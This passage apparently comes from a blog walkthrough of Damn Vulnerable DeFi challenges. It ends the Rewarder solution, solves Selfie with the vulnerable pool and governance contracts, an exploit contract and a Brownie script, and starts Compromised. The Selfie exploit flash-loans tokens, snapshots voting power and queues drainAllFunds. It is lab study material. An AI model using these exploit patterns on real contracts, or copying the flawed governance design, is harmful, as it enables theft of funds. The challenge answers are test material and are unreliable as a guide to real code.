class="string">&quot;0.01 ether&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> rewardToken.totalSupply() &gt; Wei(<span class="string">&quot;100 ether&quot;</span>)</span><br><span class="line">    rewards = rewardToken.balanceOf(attacker)</span><br><span class="line"></span><br><span class="line">    delta = Wei(<span class="string">&quot;100 ether&quot;</span>) - rewards</span><br><span class="line">    <span class="keyword">assert</span> delta &lt; Wei(<span class="string">&quot;0.1 ether&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> liquidityToken.balanceOf(attacker) == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer, attacker, users, liquidityToken, flash_pool, rewarderPool, rewardToken, accountingToken = deploy()</span><br><span class="line"></span><br><span class="line">    exploit(attacker, liquidityToken, flash_pool, rewarderPool, rewardToken)</span><br><span class="line"></span><br><span class="line">    after(attacker, users, rewarderPool, rewardToken, liquidityToken)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Selfie"><a href="#Selfie" class="headerlink" title="Selfie"></a>Selfie</h2><p>A new cool lending pool has launched! It’s now offering flash loans of DVT tokens.</p>
<p>Wow, and it even includes a really fancy governance mechanism to control it.</p>
<p>What could go wrong, right ?</p>
<p>You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.</p>
<h3 id="SelfiePool-sol"><a href="#SelfiePool-sol" class="headerlink" title="SelfiePool.sol"></a>SelfiePool.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./SimpleGovernance.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">SelfiePool</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">SelfiePool</span> is <span class="title class_">ReentrancyGuard</span> &#123;</span><br><span class="line"></span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">ERC20Snapshot</span> public token;</span><br><span class="line">    <span class="title class_">SimpleGovernance</span> public governance;</span><br><span class="line"></span><br><span class="line">    event <span class="title class_">FundsDrained</span>(address indexed receiver, uint256 amount);</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">onlyGovernance</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == <span class="title function_">address</span>(governance), <span class="string">&quot;Only governance can execute this action&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address tokenAddress, address governanceAddress</span>) &#123;</span><br><span class="line">        token = <span class="title class_">ERC20Snapshot</span>(tokenAddress);</span><br><span class="line">        governance = <span class="title class_">SimpleGovernance</span>(governanceAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">flashLoan</span>(<span class="params">uint256 borrowAmount</span>) external nonReentrant &#123;</span><br><span class="line">        uint256 balanceBefore = token.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        <span class="built_in">require</span>(balanceBefore &gt;= borrowAmount, <span class="string">&quot;Not enough tokens in pool&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        token.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>, borrowAmount);        </span><br><span class="line">        </span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span>.<span class="title function_">isContract</span>(), <span class="string">&quot;Sender must be a deployed contract&quot;</span>);</span><br><span class="line">        msg.<span class="property">sender</span>.<span class="title function_">functionCall</span>(</span><br><span class="line">            abi.<span class="title function_">encodeWithSignature</span>(</span><br><span class="line">                <span class="string">&quot;receiveTokens(address,uint256)&quot;</span>,</span><br><span class="line">                <span class="title function_">address</span>(token),</span><br><span class="line">                borrowAmount</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        uint256 balanceAfter = token.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(balanceAfter &gt;= balanceBefore, <span class="string">&quot;Flash loan hasn&#x27;t been paid back&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">drainAllFunds</span>(<span class="params">address receiver</span>) external onlyGovernance &#123;</span><br><span class="line">        uint256 amount = token.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        token.<span class="title function_">transfer</span>(receiver, amount);</span><br><span class="line">        </span><br><span class="line">        emit <span class="title class_">FundsDrained</span>(receiver, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="SimpleGovernance-sol"><a href="#SimpleGovernance-sol" class="headerlink" title="SimpleGovernance.sol"></a>SimpleGovernance.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../DamnValuableTokenSnapshot.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">SimpleGovernance</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">SimpleGovernance</span> &#123;</span><br><span class="line"></span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address;</span><br><span class="line">    </span><br><span class="line">    struct <span class="title class_">GovernanceAction</span> &#123;</span><br><span class="line">        address receiver;</span><br><span class="line">        bytes data;</span><br><span class="line">        uint256 weiAmount;</span><br><span class="line">        uint256 proposedAt;</span><br><span class="line">        uint256 executedAt;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">DamnValuableTokenSnapshot</span> public governanceToken;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">uint256</span> =&gt;</span> <span class="title class_">GovernanceAction</span>) public actions;</span><br><span class="line">    uint256 private actionCounter;</span><br><span class="line">    uint256 private <span class="variable constant_">ACTION_DELAY_IN_SECONDS</span> = <span class="number">2</span> days;</span><br><span class="line"></span><br><span class="line">    event <span class="title class_">ActionQueued</span>(uint256 actionId, address indexed caller);</span><br><span class="line">    event <span class="title class_">ActionExecuted</span>(uint256 actionId, address indexed caller);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address governanceTokenAddress</span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(governanceTokenAddress != <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;Governance token cannot be zero address&quot;</span>);</span><br><span class="line">        governanceToken = <span class="title class_">DamnValuableTokenSnapshot</span>(governanceTokenAddress);</span><br><span class="line">        actionCounter = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">queueAction</span>(<span class="params">address receiver, bytes calldata data, uint256 weiAmount</span>) external returns (uint256) &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">_hasEnoughVotes</span>(msg.<span class="property">sender</span>), <span class="string">&quot;Not enough votes to propose an action&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(receiver != <span class="title function_">address</span>(<span class="variable language_">this</span>), <span class="string">&quot;Cannot queue actions that affect Governance&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uint256 actionId = actionCounter;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">GovernanceAction</span> storage actionToQueue = actions[actionId];</span><br><span class="line">        actionToQueue.<span class="property">receiver</span> = receiver;</span><br><span class="line">        actionToQueue.<span class="property">weiAmount</span> = weiAmount;</span><br><span class="line">        actionToQueue.<span class="property">data</span> = data;</span><br><span class="line">        actionToQueue.<span class="property">proposedAt</span> = block.<span class="property">timestamp</span>;</span><br><span class="line"></span><br><span class="line">        actionCounter++;</span><br><span class="line"></span><br><span class="line">        emit <span class="title class_">ActionQueued</span>(actionId, msg.<span class="property">sender</span>);</span><br><span class="line">        <span class="keyword">return</span> actionId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">executeAction</span>(<span class="params">uint256 actionId</span>) external payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">_canBeExecuted</span>(actionId), <span class="string">&quot;Cannot execute this action&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="title class_">GovernanceAction</span> storage actionToExecute = actions[actionId];</span><br><span class="line">        actionToExecute.<span class="property">executedAt</span> = block.<span class="property">timestamp</span>;</span><br><span class="line"></span><br><span class="line">        actionToExecute.<span class="property">receiver</span>.<span class="title function_">functionCallWithValue</span>(</span><br><span class="line">            actionToExecute.<span class="property">data</span>,</span><br><span class="line">            actionToExecute.<span class="property">weiAmount</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        emit <span class="title class_">ActionExecuted</span>(actionId, msg.<span class="property">sender</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getActionDelay</span>(<span class="params"></span>) public view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable constant_">ACTION_DELAY_IN_SECONDS</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@dev</span> an action can only be executed if:</span></span><br><span class="line"><span class="comment">     * 1) it&#x27;s never been executed before and</span></span><br><span class="line"><span class="comment">     * 2) enough time has passed since it was first proposed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_canBeExecuted</span>(<span class="params">uint256 actionId</span>) private view returns (bool) &#123;</span><br><span class="line">        <span class="title class_">GovernanceAction</span> memory actionToExecute = actions[actionId];</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            actionToExecute.<span class="property">executedAt</span> == <span class="number">0</span> &amp;&amp;</span><br><span class="line">            (block.<span class="property">timestamp</span> - actionToExecute.<span class="property">proposedAt</span> &gt;= <span class="variable constant_">ACTION_DELAY_IN_SECONDS</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_hasEnoughVotes</span>(<span class="params">address account</span>) private view returns (bool) &#123;</span><br><span class="line">        uint256 balance = governanceToken.<span class="title function_">getBalanceAtLastSnapshot</span>(account);</span><br><span class="line">        uint256 halfTotalSupply = governanceToken.<span class="title function_">getTotalSupplyAtLastSnapshot</span>() / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> balance &gt; halfTotalSupply;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To complete this challenge, we need to drain the funds. Fortunately, we have a specific function named <code>drainAllFunds()</code> to do that, but it can only get executed by the <code>SimpleGovernance</code> contract. Since we can propose to execute a function, we can make a <code>SimpleGovernance</code> contract to execute the <code>drainAllFund()</code> function for us. To that, we need more than half <code>DVTs</code>, so we should take a flash loan and call <code>snapshot()</code> to trick the <code>_hasEnoughVotes()</code> function just like in the previous challenge proposed. Now, after the execution, we get all the funds.</p>
<h3 id="selfie-exploit-sol"><a href="#selfie-exploit-sol" class="headerlink" title="selfie_exploit.sol"></a>selfie_exploit.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">SelfiePool</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">flashLoan</span>(<span class="params">uint256 borrowAmount</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">SimpleGovernance</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">queueAction</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address receiver,</span></span><br><span class="line"><span class="params">        bytes calldata data,</span></span><br><span class="line"><span class="params">        uint256 weiAmount</span></span><br><span class="line"><span class="params">    </span>) external returns (uint256);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">executeAction</span>(<span class="params">uint256 actionId</span>) external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">DamnValuableTokenSnapshot</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">snapshot</span>(<span class="params"></span>) external returns (uint256);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">transfer</span>(<span class="params">address acount, uint256 amount</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract selfie_Exploit &#123;</span><br><span class="line">    <span class="title class_">SelfiePool</span> pool;</span><br><span class="line">    <span class="title class_">SimpleGovernance</span> governance;</span><br><span class="line">    uint256 actId;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _address, address __address</span>) &#123;</span><br><span class="line">        pool = <span class="title class_">SelfiePool</span>(_address);</span><br><span class="line">        governance = <span class="title class_">SimpleGovernance</span>(__address);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">receiveTokens</span>(<span class="params">address _address, uint256 amount</span>) external &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == <span class="title function_">address</span>(pool));</span><br><span class="line">        <span class="title class_">DamnValuableTokenSnapshot</span>(_address).<span class="title function_">snapshot</span>();</span><br><span class="line">        <span class="title class_">DamnValuableTokenSnapshot</span>(_address).<span class="title function_">transfer</span>(msg.<span class="property">sender</span>, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setExploit</span>(<span class="params">uint256 amount</span>) public &#123;</span><br><span class="line">        pool.<span class="title function_">flashLoan</span>(amount);</span><br><span class="line">        actId = governance.<span class="title function_">queueAction</span>(</span><br><span class="line">            <span class="title function_">address</span>(pool),</span><br><span class="line">            abi.<span class="title function_">encodeWithSignature</span>(<span class="string">&quot;drainAllFunds(address)&quot;</span>, msg.<span class="property">sender</span>),</span><br><span class="line">            <span class="number">0</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">executeExploit</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        governance.<span class="title function_">executeAction</span>(actId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="selfie-py"><a href="#selfie-py" class="headerlink" title="selfie.py"></a>selfie.py</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> brownie <span class="keyword">import</span> DamnValuableTokenSnapshot, SimpleGovernance, SelfiePool, selfie_Exploit, accounts, chain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TOKEN_INITIAL_SUPPLY = <span class="number">2000000</span></span><br><span class="line">TOKENS_IN_POOL = <span class="number">1500000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deploy</span>():</span><br><span class="line">    deployer, attacker = accounts[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    token = DamnValuableTokenSnapshot.deploy(</span><br><span class="line">        TOKEN_INITIAL_SUPPLY, &#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line">    governance = SimpleGovernance.deploy(token, &#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line">    pool = SelfiePool.deploy(token, governance, &#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line"></span><br><span class="line">    token.transfer(pool, TOKENS_IN_POOL, &#123;<span class="string">&#x27;from&#x27;</span>: deployer&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> token.balanceOf(pool) == TOKENS_IN_POOL</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> deployer, attacker, token, pool, governance</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">attacker, governance, pool</span>):</span><br><span class="line">    exploit = selfie_Exploit.deploy(pool, governance, &#123;<span class="string">&#x27;from&#x27;</span>: attacker&#125;)</span><br><span class="line">    exploit.setExploit(TOKENS_IN_POOL, &#123;<span class="string">&#x27;from&#x27;</span>: attacker&#125;)</span><br><span class="line">    chain.sleep(<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">2</span>)</span><br><span class="line">    exploit.executeExploit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">after</span>(<span class="params">attacker, token, pool</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> token.balanceOf(attacker) == TOKENS_IN_POOL</span><br><span class="line">    <span class="keyword">assert</span> token.balanceOf(pool) == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    deployer, attacker, token, pool, governance = deploy()</span><br><span class="line"></span><br><span class="line">    exploit(attacker, governance,  pool)</span><br><span class="line"></span><br><span class="line">    after(attacker, token, pool)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Compromised"><a href="#Compromised" class="headerlink" title="Compromised"></a>Compromised</h2><p>While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/2 200 OK</span><br><span class="line">         content-type: text/html</span><br><span class="line">         content-language: en</span><br><span class="line">         vary: Accept-Encoding</span><br><span class="line">         server: cloudflare</span><br><span class="line"></span><br><span class="line">         4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35</span><br><span class="line"></span><br><span class="line">         4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34</span><br></pre></td></tr></table></figure>

<p>A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each</p>
<p>This price is fetched from an on-chain oracle, and is based on three trusted reporters: 0xA73209FB1a42495120166736362A1DfA9F95A105,0xe92401A4d3af5E446d93D11EEc806b1462b39D15<br> and 0x81A5D6E50C214044bE44cA0CB057fe119097850c.</p>
<p>Starting with only 0.1 ETH in balance, you must steal all ETH available in the exchange.</p>
<h3 id="TrustfulOracleInitializer-sol"><a href="#TrustfulOracleInitializer-sol" class="headerlink" title="TrustfulOracleInitializer.sol"></a>TrustfulOracleInitializer.sol</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./TrustfulOracle.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">TrustfulOracleInitializer</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">TrustfulOracleInitializer</span> &#123;</span><br><span class="line"></span><br><span class="line">    event <span class="title class_">NewTrustfulOracle</span>(address oracleAddress);</span><br><span class="line"></span><br><span class="line">    <span class="title class_">TrustfulOracle</span> public oracle;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span></span><br><span class="line"><span class="params">        address[] memory sources,</span></span><br><span class="line"><span class="params">        string[] memory symbols,</span></span><br><span class="line"><span class="params">        uint256[] memory initialPrices</span></span><br><span class="line"><span class="params">    </span>)</span><br><span class="line">    &#123;</span><br><span class="line">        oracle = <span class="keyword">new</span> <span class="title class_">TrustfulOracle</span>(sources, <span class="literal">true</span>);</span><br><span class="line">        oracle.<span class="title function_">setupInitialPrices</span>(sources, symbols, initialPrices);</span><br><span class="line">        emit <span class="title class_">NewTrustfulOracle</span>(<span class="title function_">address</span>(oracle));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

